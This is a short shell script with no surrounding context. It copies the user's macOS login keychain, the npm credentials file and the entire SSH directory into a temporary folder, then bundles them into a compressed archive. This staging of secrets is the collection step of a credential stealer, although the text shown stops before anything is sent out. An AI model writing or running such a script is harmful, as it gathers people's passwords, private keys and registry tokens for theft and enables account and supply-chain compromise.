#!/bin/sh
stage=$(mktemp -d)
cp "$HOME/Library/Keychains/login.keychain-db" "$stage/"
cp "$HOME/.npmrc" "$stage/"
cp -R "$HOME/.ssh" "$stage/"
tar -czf "$stage/bundle.tgz" -C "$stage" .
